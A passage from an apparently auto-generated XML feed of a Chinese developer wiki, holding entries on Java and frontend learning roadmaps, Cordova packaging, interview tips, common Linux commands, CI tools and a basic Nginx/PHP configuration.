        <content type="html"><![CDATA[<ol><li><p>Java基础</p></li><li><p>Web开发基础知识</p><ul><li>浏览器工作原理</li><li>Servlet和JSP</li><li>HTTP协议</li><li>DNS解析原理</li><li>HTML、CSS、JS</li></ul></li><li><p>Java框架</p><ul><li>Spring、Spring MVC</li><li>Mybatis</li><li>Hibernate</li><li>Shiro\Spring security</li><li>Spring boot</li><li>JWT token认证方案</li></ul></li><li><p>常用library</p><ul><li>Google guava集合处理和常用工具</li><li>Apache commons api</li><li>Quartz计划任务处理</li><li>Jackson json处理</li><li>Selflog 日志生成</li><li>freemarker模板引擎</li><li>Apache httpcomponent HTTP client工具</li></ul></li><li><p>数据库</p><ul><li>Mysql</li><li>MongoDB</li><li>Redis</li></ul></li><li><p>架构设计</p><ul><li>OAuth</li><li>Restful API设计</li><li>SSO单点登录</li><li>分布式框架Dubbo</li><li>微服务框架Spring cloud</li></ul></li><li><p>工程化</p><ul><li>Gradle\Maven构建工具</li><li>Jenkins</li><li>Circleci PaaS平台的CI</li><li>Checkstyle代码质量检测</li><li>FindBugs代码检测</li><li>Swagger文档管理</li><li>Axway webgate网关方案</li></ul></li><li><p>测试</p><ul><li>Contract 测试Pact</li><li>Junit</li><li>Assertj断言库</li><li>mockito 单元测试Mock工具</li><li>WireMock数据拦截和模拟</li></ul></li><li><p>部署和监控</p><ul><li>Linux</li><li>Tomcat web服务器</li><li>Nginx负载均衡</li><li>Splunk日志管理</li><li>Dynatrace</li><li>ELK(ElasticSearch+Logstash+ Kibana)</li><li>Spring boot admin监控</li></ul></li><li><p>项目管理</p><ul><li>禅道管理平台</li><li>Trello看板管理</li><li>Confluence文档管理</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 学习教程资源收集</title>
      <link href="/java/java/Java%20tutorial%20collection/"/>
      <url>/java/java/Java%20tutorial%20collection/</url>
      
        <content type="html"><![CDATA[<h3 id="教程列表"><a href="#教程列表" class="headerlink" title="教程列表"></a>教程列表</h3><p>下列顺序可以作为学习路线图</p><ul><li>入门教程 <a href="http://www.runoob.com/java/java-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-tutorial.html</a></li><li>Servlet <a href="http://www.runoob.com/servlet/servlet-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/servlet/servlet-tutorial.html</a></li><li>JSP <a href="http://www.runoob.com/jsp/jsp-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/jsp/jsp-tutorial.html</a></li><li>Spring mvc<ul><li>张开涛 <a href="http://jinnianshilongnian.iteye.com/category/231099" target="_blank" rel="noopener">http://jinnianshilongnian.iteye.com/category/231099</a></li><li>传智播客视屏教程</li></ul></li><li><p>Maven <a href="https://www.lynda.com/Maven-tutorials/Multi-Module-Build-Automation-Maven/520530-2.html?srchtrk=index%3a1%0alinktypeid%3a2%0aq%3amaven+%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2" target="_blank" rel="noopener">https://www.lynda.com/Maven-tutorials/Multi-Module-Build-Automation-Maven/520530-2.html?srchtrk=index%3a1%0alinktypeid%3a2%0aq%3amaven+%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2</a></p></li><li><p>Mybatis</p></li><li>Hibernate</li></ul><h3 id="其他资料收集"><a href="#其他资料收集" class="headerlink" title="其他资料收集"></a>其他资料收集</h3><ul><li>一些Java基础例子 <a href="http://www.runoob.com/java/java-examples.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-examples.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用Java构建API的知识体系</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/simple-api-archtecture/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/simple-api-archtecture/</url>
      
        <content type="html"><![CDATA[<ul><li>API基本概念及资源的定义</li><li>RESTful架构风格与成熟度模型</li><li>规范化接口定义与设计</li><li>JSON API Spec</li><li>初始化项目环境并启动一个API Demo</li><li>用Spring Boot快速构建项目</li><li>Swagger UI对API文档化</li><li>搭建多个不同业务的APIs</li><li>API升级及版本控制策略</li><li>API的认证与授权（常用的API认证方法及安全问题）</li><li>Axway网关集成及流量控制</li><li>服务负载均衡ELB/F5</li><li>Hyxtrix故障熔断器，阻止故障雪崩</li><li>API中使用RxJava进行响应式编程</li><li>最佳实践及总结</li><li>日志监控与错误追踪</li><li>调用链跟踪和性能面板</li><li>Dynatrace &amp; Zipkin</li><li>AH Portal &amp; Splunk</li><li>什么是消费者契约测试？</li><li>契约测试工具Pact的使用</li><li>Spring Cloud Contract的使用？</li><li>API测试工具的使用（SoapUI/Postman/自动化测试）</li><li>Spring Cloud 理念</li><li>配置服务器应用</li><li>API服务注册与发现</li><li>GraphQL?</li><li>遗留系统向微服务架构迁移</li><li>最佳实践</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>wiki 使用方法</title>
      <link href="/help/how-to-use-this-wiki/"/>
      <url>/help/how-to-use-this-wiki/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-hexo"><a href="#关于-hexo" class="headerlink" title="关于 hexo"></a>关于 hexo</h2><p>本 wiki 的思路为使用github作为文档、代码的版本管理,使用 hexo 来生成静态网站。摒弃了博客的写作方式,使用了 markdown 和 wiki 的方式,</p><p>从首页的导航链接直接进入所有的文档,配合搜索框一部了然,用于建立一个知识地图,因此能快速的编写和寻找需要的资料。</p><h2 id="更多-Hexo-的资料"><a href="#更多-Hexo-的资料" class="headerlink" title="更多 Hexo 的资料"></a>更多 Hexo 的资料</h2><ul><li><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a></li><li><a href="https://github.com" target="_blank" rel="noopener">Github</a></li></ul><h2 id="怎么使用"><a href="#怎么使用" class="headerlink" title="怎么使用"></a>怎么使用</h2><h3 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a>图片插件</h3><p>创建文章同名目录,然后放置图片或者其他资源即可使用相对路径访问</p><p><img src="/help/how-to-use-this-wiki/05a4c81a-8793-4baa-92a1-94b28aece873.jpg" alt=""></p><p><a href="hello-world.md">测试连接</a></p><h2 id="常用-markdown-语法"><a href="#常用-markdown-语法" class="headerlink" title="常用 markdown 语法"></a>常用 markdown 语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><pre><code># 一级标题## 二级标题### 三级标题##### 四级标题###### 五级标题###### 六级标题</code></pre><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><pre><code>- Red- Green- Blue* Red* Green* Blue+ Red+ Green+ Blue</code></pre><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><pre><code>&gt; 这是一个引用</code></pre><h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><pre><code>图片：![]()    ![图片文本(可忽略)](图片地址)链接：[]()     [链接文本](链接地址)</code></pre><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>| 标题            |      标题       |            标题 || :-------------- | :-------------: | --------------: || 居左测试文本    |  居中测试文本   |    居右测试文本 || 居左测试文本1   |  居中测试文本2  |   居右测试文本3 || 居左测试文本11  | 居中测试文本22  |  居右测试文本33 || 居左测试文本111 | 居中测试文本222 | 居右测试文本333 |</code></pre><h2 id="参考其他大神博客"><a href="#参考其他大神博客" class="headerlink" title="参考其他大神博客"></a>参考其他大神博客</h2><ul><li>擅长 Java 和大数据相关的博主 <a href="https://blog.csdn.net/vbirdbest" target="_blank" rel="noopener">https://blog.csdn.net/vbirdbest</a></li><li>擅长 java、运维、大数据的博主，非常擅长收藏 <a href="https://www.cnblogs.com/jpfss/" target="_blank" rel="noopener">https://www.cnblogs.com/jpfss/</a></li><li>擅长高并发和 GC 调优、MySQL、网络、微服务  <a href="https://www.cnblogs.com/duanxz" target="_blank" rel="noopener">https://www.cnblogs.com/duanxz</a></li><li>一个年轻的兄弟，擅长微服务 <a href="https://www.cnblogs.com/sxdcgaq8080/p/12525626.html" target="_blank" rel="noopener">https://www.cnblogs.com/sxdcgaq8080/p/12525626.html</a></li><li>一位大神谈学习 <a href="https://www.cnblogs.com/maowang1991/p/3572377.html#4284615" target="_blank" rel="noopener">https://www.cnblogs.com/maowang1991/p/3572377.html#4284615</a></li><li>一个 Java 后端作者的笔记，适合 Java 中级看 <a href="https://www.cnblogs.com/wangdaijun/" target="_blank" rel="noopener">https://www.cnblogs.com/wangdaijun/</a></li><li>一位大数据相关的博主，对 linux 研究非常到位 <a href="https://www.cnblogs.com/felixzh/" target="_blank" rel="noopener">https://www.cnblogs.com/felixzh/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> help </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 webapp技术选型</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/H5-webapp-tech-stack/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/H5-webapp-tech-stack/</url>
      
        <content type="html"><![CDATA[<h3 id="VUE-技术方案-如果需要嵌入微信等APP中，推荐该方案"><a href="#VUE-技术方案-如果需要嵌入微信等APP中，推荐该方案" class="headerlink" title="VUE 技术方案 (如果需要嵌入微信等APP中，推荐该方案)"></a>VUE 技术方案 (如果需要嵌入微信等APP中，推荐该方案)</h3><ul><li>vuejs2.0</li><li>vue-router</li><li>vuex</li><li>mint-ui</li><li>Jest</li></ul><p>常用lib信息</p><table><thead><tr><th>包名</th><th style="text-align:center">用途</th></tr></thead><tbody><tr><td>Vue</td><td style="text-align:center">VUE视图</td></tr><tr><td>Vue-router</td><td style="text-align:center">路由</td></tr><tr><td>Typescript</td><td style="text-align:center">静态类型</td></tr><tr><td>vuex</td><td style="text-align:center">状态管理</td></tr><tr><td>mint-ui</td><td style="text-align:center">ui框架</td></tr><tr><td>Jest</td><td style="text-align:center">测试框架</td></tr><tr><td>axios</td><td style="text-align:center">HTTP库</td></tr><tr><td>immutable</td><td style="text-align:center">immutable 工具</td></tr><tr><td>moment</td><td style="text-align:center">时间处理库</td></tr><tr><td>vue-class-component</td><td style="text-align:center">vue 的面向对象形式</td></tr><tr><td>vue-property-decorator</td><td style="text-align:center">vue 装饰器</td></tr><tr><td>vuex-class</td><td style="text-align:center">vuex的面向对象形式</td></tr><tr><td>vconsole</td><td style="text-align:center">手机网页调试工具</td></tr></tbody></table><p>参考资料:</p><ul><li>vue官方脚手架 (支持 TS、Babel、Vuex、SASS): <a href="https://www.npmjs.com/package/vue-cli" target="_blank" rel="noopener">https://www.npmjs.com/package/vue-cli</a></li><li><a href="https://segmentfault.com/a/1190000013676663" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013676663</a> VUE + TS的项目搭建</li></ul><h3 id="HBuilder方案"><a href="#HBuilder方案" class="headerlink" title="HBuilder方案"></a>HBuilder方案</h3><ul><li>mui</li><li>Hbuilder</li></ul><p>成本低廉，开发方面，原生的webview API和切换性能也可<br>参考案例：<a href="https://github.com/linksgo2011/tinda_app_cordova/" target="_blank" rel="noopener">https://github.com/linksgo2011/tinda_app_cordova/</a></p><p>注意事项</p><ul><li>每个页面为一个独立的窗口</li><li>返回会有数据刷新问题</li><li>窗口内如果发生页面跳转，会造成路由不一致</li><li>尽量使用页面 + API的方式快速开发</li></ul><h3 id="React技术选型"><a href="#React技术选型" class="headerlink" title="React技术选型"></a>React技术选型</h3><ul><li>React</li><li>Redux </li><li>webpack</li></ul><p>参考案例</p><ul><li>cnode 客户端方案可以构建出web、mobile各种平台</li></ul><h3 id="Jquery技术方案"><a href="#Jquery技术方案" class="headerlink" title="Jquery技术方案"></a>Jquery技术方案</h3><ul><li>mui</li><li>zepto.js or jquery.js</li></ul><p>参考案例</p><ul><li>vue购物车 <a href="https://github.com/liu-zhuang/Vue-Demo" target="_blank" rel="noopener">https://github.com/liu-zhuang/Vue-Demo</a></li><li><a href="https://github.com/zoeminghong/shopping-cart-vue-project" target="_blank" rel="noopener">https://github.com/zoeminghong/shopping-cart-vue-project</a></li><li>音乐APP <a href="https://www.cnblogs.com/smartXiang/p/6055616.html" target="_blank" rel="noopener">https://www.cnblogs.com/smartXiang/p/6055616.html</a></li></ul><h2 id="打包方案"><a href="#打包方案" class="headerlink" title="打包方案"></a>打包方案</h2><p>使用cordova <a href="http://wiki.printf.cn/h5/h5/Build">http://wiki.printf.cn/h5/h5/Build</a> package with Apache Cordova</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端生态图谱</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20ecologies/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20ecologies/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><ul><li>开发模式<ul><li>多页面开发 前端开发人员切页面然后和后端开发语言模板系统集成比如（PHP、JSP、EJS、JADE），后端进行渲染，前后端不分离，输出为JS、HTML、CSS等，前端开发可以对JS、CSS进行压缩或其他处理</li><li>单页面开发 使用富前端开发思想，后端只需要提供一个入口的页面和API，前端负责路由和渲染。前后端分离，前端一般会对资源进行打包，然后输出一个index.html 和 app.js,前端完成所有的业务逻辑和API调用。</li></ul></li></ul><ul><li><p>前端发展过程</p><ul><li>原生JS</li><li>JQuery + 插件开发模式，大规模的编写后台管理系统，easyUI</li><li>Backbone 的轻量级的MVC开发模式</li></ul></li><li><p>开发模式</p><ul><li><p>MVC 前端变成了一个application，index.html 入口启动, </p><ul><li>M model 一个可以操作的数据实体</li><li>V view 显示层，把数据渲染在页面上</li><li>C controller/collect 控制器</li><li>代表的框架：Backbone</li></ul></li><li><p>MVVM 解决了前端数据输入和输出映射问题</p><ul><li>M model</li><li>V 视图</li><li>MV-VM 意义是数据渲染到视图中，然后也可以从视图中获取数据，这就是双向绑定</li><li>代表框架：Angularjs </li></ul></li><li><p>单项数据流+渲染引擎</p><ul><li>React 是什么？React只是一个单项的高效的渲染引擎而已</li><li>我们讲React的时候往往在谈论React+Redux一套完整的开发生态</li><li>React/VUE</li></ul></li></ul></li><li><p>前端构建工具</p><ul><li>Node 前端开发为什么需要用Node？Node只是提供了一个JS的非浏览器运行环境（采用了chrome的V8引擎）。</li><li>Npm 一个nodejs 包管理工具和平台，NPM可以用来管理JS的依赖和包，NPM就可以安装大量的前端开发工具，NPM的描述文件为package.json<ul><li>npm install 安装当前目录下package.json 中所有的依赖</li></ul></li><li><p>构建工具</p><ul><li><p>grunt 提供了一个流处理工作环境，用来编写前端批处理任务，比如压缩JS、编译less、Sass等</p><ul><li>grunt的描述文件为Gruntfile.js</li><li>grunt的工作方式为通过编写gruntfile来组合grunt插件完成相应任务</li><li>grunt 常用插件<ul><li>requirejs 如果前端使用了模块化可以加载此类插件</li><li>uglify  </li><li>css_import 多个css组合成一个</li><li>cssmin 把css压缩成小文件</li><li>jshint 根据某种规则对JS代码检查</li></ul></li><li>一个例子项目 <a href="https://github.com/linksgo2011/backbone-weui" target="_blank" rel="noopener">https://github.com/linksgo2011/backbone-weui</a></li></ul></li><li><p>gulp 思路和grunt一致，但是gulp不仅提供了配置的方法，还可以交互式进行编程</p></li><li>webpack 资源的load和打包，webpack主要对单页面应用开发使用<ul><li>通过loader的思想，对前端资源进行管理和打包操作</li><li>Babel</li><li>Es6</li><li>Eslint</li></ul></li></ul></li></ul></li><li><p>React 生态</p><ul><li>Reactjs</li><li>React-router</li><li>Redux</li><li>React form </li><li>axios</li><li>工具<ul><li>lodash</li><li>moment</li></ul></li><li>webpack 配置</li><li>组件库 <a href="http://ant.design/" target="_blank" rel="noopener">http://ant.design/</a></li></ul></li><li><p>Vue 生态</p></li><li><p>前端的模块化历史</p><ul><li>没有模块化的时候<ul><li>命名空间放置变量作用于泄露 app.xx.fun1 = function(){}</li></ul></li><li>Requirejs</li><li>commonjs</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 Cordova打包方案</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/build-package%20with-apache-cordova/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/build-package%20with-apache-cordova/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么需要H5打包？"><a href="#为什么需要H5打包？" class="headerlink" title="为什么需要H5打包？"></a>为什么需要H5打包？</h2><p>通过H5可以开发跨平台的APP，比如安卓、IOS.</p><h2 id="使用Cordova打包"><a href="#使用Cordova打包" class="headerlink" title="使用Cordova打包"></a>使用Cordova打包</h2><p>使用npm安装</p><blockquote><p>npm install -g cordova</p></blockquote><p>创建一个项目</p><blockquote><p>cordova create hello com.example.hello HelloWorld</p></blockquote><p>在这个项目下有一个www的目录，该目录就是放置我们的webapp的位置</p><p>然后我们可以添加需要编译的平台</p><blockquote><p>cordova platform add ios<br>cordova platform add android</p></blockquote><p>查看添加的平台</p><blockquote><p>cordova platform ls</p></blockquote><p>构建所有平台</p><blockquote><p>cordova build</p></blockquote><p>构建指定平台</p><blockquote><p>cordova build ios</p></blockquote><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://cordova.apache.org/docs/en/latest/guide/cli/" target="_blank" rel="noopener">https://cordova.apache.org/docs/en/latest/guide/cli/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端面试tips</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/Interview%20for%20frontend/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/Interview%20for%20frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="面试考察目标"><a href="#面试考察目标" class="headerlink" title="面试考察目标"></a>面试考察目标</h2><ul><li>对于编程语言的掌握程度，比如基本语法，语言特性等等</li><li>实际动手写代码的速度，比如敲代码过程中是否流畅</li><li>Code Smell的识别与重构能力</li><li>对于软件设计的理解深度</li><li>对遇到问题的解决思路以及反应速度</li><li>对新需求的反应和理解速度</li><li>对新事物的态度和学习能力，比如新IDE，TDD等</li><li>沟通交流、协作能力</li><li>对待Feedback的态度</li></ul><h2 id="面试准备"><a href="#面试准备" class="headerlink" title="面试准备"></a>面试准备</h2><ol><li>作业查看</li><li>收集上一轮面试反馈</li><li>关键信息收集<ul><li>姓名</li><li>技术栈</li><li>工作年限</li><li>项目经历</li><li>毕业院校</li></ul></li></ol><h2 id="准备问题的几个维度"><a href="#准备问题的几个维度" class="headerlink" title="准备问题的几个维度"></a>准备问题的几个维度</h2><ol><li>理论基础</li><li>常用编程技巧是否熟练</li><li>接受Feedback和沟通是否顺畅</li><li>学习能力</li><li>发现问题能力</li><li>工程设计能力</li><li>细节和质量控制能力</li></ol><h2 id="几个可选的问题"><a href="#几个可选的问题" class="headerlink" title="几个可选的问题"></a>几个可选的问题</h2><ol><li>工作中是否使用了ES6那些语法特性?</li><li>了解哪些前端框架和库，他们的特点是什么？</li><li>你觉得这里用xxx是不是好一些？</li><li>如果你拿到一个新的框架，会怎么去快速上手？</li><li>对于你的代码，你觉得哪些点还可以提升？</li><li>这些逻辑是不是可以抽象出来？</li><li>怎么写单元测试？</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS样式框架选型</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20boilderplate/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20boilderplate/</url>
      
        <content type="html"><![CDATA[<p>浏览器样式重置基本样式<br><a href="http://necolas.github.io/normalize.css/" target="_blank" rel="noopener">http://necolas.github.io/normalize.css/</a></p><p>simple, responsive boilerplate.<br><a href="http://getskeleton.com/" target="_blank" rel="noopener">http://getskeleton.com/</a></p><p>推荐使用，简单纯净易于修改，适用于定制性更强的项目</p><p>frozenui 腾讯出品</p><p><a href="http://frozenui.github.io/" target="_blank" rel="noopener">http://frozenui.github.io/</a></p><p>妹子UI，中国版的bootstrap<br><a href="http://amazeui.org/" target="_blank" rel="noopener">http://amazeui.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最实用的Linux命令</title>
      <link href="/linux/linux/common-useful-commands/"/>
      <url>/linux/linux/common-useful-commands/</url>
      
        <content type="html"><![CDATA[<p>查看操作系统信息</p><blockquote><p>head -n 1 /etc/issue</p></blockquote><p>install JDK8 in ubuntu 14.04</p><p>Add the webupd8 ppa, and install from that -</p><blockquote><p>sudo add-apt-repository ppa:webupd8team/java</p></blockquote><blockquote><p>sudo apt-get update</p></blockquote><blockquote><p>sudo apt-get install oracle-java8-installer</p></blockquote><p>Then</p><blockquote><p>java -version</p></blockquote><p>should show you using Oracle Java 8. If not, or if you want to use a different version - run update-java-alternatives with something like,</p><blockquote><p>sudo update-java-alternatives -s java-8-oracle</p></blockquote><p>or</p><blockquote><p>sudo update-java-alternatives -s java-7-oracle</p></blockquote><p>As appropriate.</p><p>Got the error: apt-get-repository Command is Missing</p><p>fixed by</p><blockquote><p>sudo apt-get update</p></blockquote><blockquote><p>sudo apt-get install software-properties-common</p></blockquote><p><a href="https://stackoverflow.com/questions/25549492/install-jdk8-in-ubuntu-14-04" target="_blank" rel="noopener">https://stackoverflow.com/questions/25549492/install-jdk8-in-ubuntu-14-04</a></p><p>打包备份</p><blockquote><p>tar -zcvf “jiaonuobg_assets_$(date “+%Y%m%d”).tar.gz” jiaonuobg/assets</p></blockquote><p>备份nodejs+mysql项目</p><p>TBC</p><p>Maven wrapper 生成</p><blockquote><p>mvn -N io.takari:maven:wrapper</p></blockquote><p>根据端口查询Linux PID</p><blockquote><p>netstat -apn | grap $port</p></blockquote><p>从字符串中提取数字，例如PID</p><blockquote><p>output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ }<br>echo $num5</p></blockquote><p>让进程在后台执行</p><blockquote><p>java -jar package.jar &amp;</p></blockquote><p>执行一段Linux命令并给变量赋值</p><blockquote><p>output=$(netstat -apn | grep 8086 | sed ‘s/[0-9]*//g’)<br>echo $output</p></blockquote><p>查看服务器内存用量</p><blockquote><p>sudo free</p></blockquote><p>查看服务器磁盘用量</p><blockquote><p>sudo df -h</p></blockquote><p>Git 增加文件执行权限</p><blockquote><p>git update-index –chmod=+x $script</p></blockquote><p>查看sudo 环境下有哪些可用的权限</p><blockquote><p>sudo -l</p></blockquote><p>搜索文件相关</p><p>当前文件目录下搜索</p><blockquote><p>grep -RI ‘keyword’  .  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>免费的CI/CD 工具</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/CI-free-tools/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/CI-free-tools/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要使用CI"><a href="#为什么要使用CI" class="headerlink" title="为什么要使用CI?"></a>为什么要使用CI?</h3><p>方便集成发布和包管理,举个例子就是在Merge PR之前运行测试,如果测试没有通过,不允许合并代码。</p><h3 id="能和Github集成的CI工具"><a href="#能和Github集成的CI工具" class="headerlink" title="能和Github集成的CI工具"></a>能和Github集成的CI工具</h3><p><a href="https://github.com/marketplace/category/continuous-integration" target="_blank" rel="noopener">https://github.com/marketplace/category/continuous-integration</a></p><p>Travis CI<br>CircleCI 推荐使用</p><h3 id="Github-flow"><a href="#Github-flow" class="headerlink" title="Github flow"></a>Github flow</h3><p>关键点</p><ul><li>代码质量</li><li>代码安全扫描</li><li>报警</li><li>包管理</li><li>自动部署和发布</li><li>代码审查</li></ul><p><a href="https://help.github.com/articles/github-flow/" target="_blank" rel="noopener">https://help.github.com/articles/github-flow/</a></p><p>使用github开发步骤</p><ul><li>Create a branch from the repository.</li><li>Create, edit, rename, move, or delete files.</li><li>Send a pull request from your branch with your proposed changes to kick off a discussion.</li><li>Make changes on your branch as needed. Your pull request will update automatically.</li><li>Merge the pull request once the branch is ready to be merged.</li><li>Tidy up your branches using the delete button in the pull request or on the branches page.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>系统监控和维护</title>
      <link href="/linux/linux/monitors-for%20website/"/>
      <url>/linux/linux/monitors-for%20website/</url>
      
        <content type="html"><![CDATA[<h2 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h2><pre><code>- 查看日志文件命令    - cat 快速显示文件    - more less 分页查找    - tail 显示文件尾    - head 显示文件头    - sort 内容排序    - wc 字符统计 wc 为Word count的缩写    - uniq 去重连续的重复行 </code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx 常用操作</title>
      <link href="/linux/linux/nginx-usful%20command/"/>
      <url>/linux/linux/nginx-usful%20command/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-Nginx"><a href="#什么是-Nginx" class="headerlink" title="什么是 Nginx"></a>什么是 Nginx</h1><p>Nginx是一个优秀的web服务器，同时也可以用作负载均衡和反向代理 </p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在Ubuntu的环境下，安装Nginx</p><blockquote><p>apt-get install nginx</p></blockquote><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>配置修改后不停服重载</p><blockquote><p>service nginx reload</p></blockquote><p>停服重启</p><blockquote><p>service nginx start</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Nginx的配置文件位于</p><p><code>/etc/nginx</code></p><p>配置文件入口为 nginx.conf，其中定义了全局的配置文件，包括日志位置、gzip、邮件以及加载站点的等配置。</p><p>我们常用的站点信息配置在：</p><p>/etc/nginx/sites-enabled/*;</p><h3 id="一个默认的配置文件"><a href="#一个默认的配置文件" class="headerlink" title="一个默认的配置文件"></a>一个默认的配置文件</h3><p><code></code><br>server {<br>    listen 80 default_server;<br>    listen [::]:80 default_server ipv6only=on;</p><pre><code># 资源根目录root /var/www;# 主页index index.html index.htm index.php ;# Make site accessible from http://localhost/server_name localhost;location / {    # First attempt to serve request as file, then    # as directory, then fall back to displaying a 404.    try_files $uri $uri/ =404;    # Uncomment to enable naxsi on this location    # include /etc/nginx/naxsi.rules}# 配置反向代理 例如 host/sub-path -&gt; http://127.0.0.1:8080; # Only for nginx-naxsi used with nginx-naxsi-ui : process denied requests#location /RequestDenied {#    proxy_pass http://127.0.0.1:8080;    #}#error_page 404 /404.html;# redirect server error pages to the static page /50x.html##error_page 500 502 503 504 /50x.html;#location = /50x.html {#    root /usr/share/nginx/html;#}# 开启PHP 解析# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \.php$ {    fastcgi_split_path_info ^(.+\.php)(/.+)$;    # NOTE: You should have &quot;cgi.fix_pathinfo = 0;&quot; in php.ini    # With php5-cgi alone:    fastcgi_pass 127.0.0.1:9000;    # With php5-fpm:    fastcgi_pass unix:/var/run/php5-fpm.sock;    fastcgi_index index.php;    include fastcgi_params;}# deny access to .htaccess files, if Apache&#39;s document root# concurs with nginx&#39;s one##location ~ /\.ht {#    deny all;#}</code></pre><p>}</p><p><code></code></p><h3 id="Nginx-解析PHP的原理"><a href="#Nginx-解析PHP的原理" class="headerlink" title="Nginx 解析PHP的原理"></a>Nginx 解析PHP的原理</h3><p>Nginx发送请求到php-fpm进程，然后php-fpm解析后返回给Nginx，即HTTP协议处理为Nginx完成，php-fpm 作为后台服务解析PHP页面</p><h3 id="Nginx-增加虚拟主机方法"><a href="#Nginx-增加虚拟主机方法" class="headerlink" title="Nginx 增加虚拟主机方法"></a>Nginx 增加虚拟主机方法</h3><blockquote><p>mv default v-host</p></blockquote><blockquote><p>vim v-host</p></blockquote><p>然后修改 v-host 文件中server_name为站点域名，讲该域名DNS指向本机即可</p><p>然后重在或者重启Nginx服务器 </p><blockquote><p>service nginx restart</p></blockquote><p>查看服务器状态</p><blockquote><p>service nginx status</p></blockquote><p>如果服务器重启有误或者无效，可以在nginx.info 中找到日志文件查看并修改。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Gradle 构建 Spring boot 项目</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/gradle-build-spring-boot/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/gradle-build-spring-boot/</url>
      
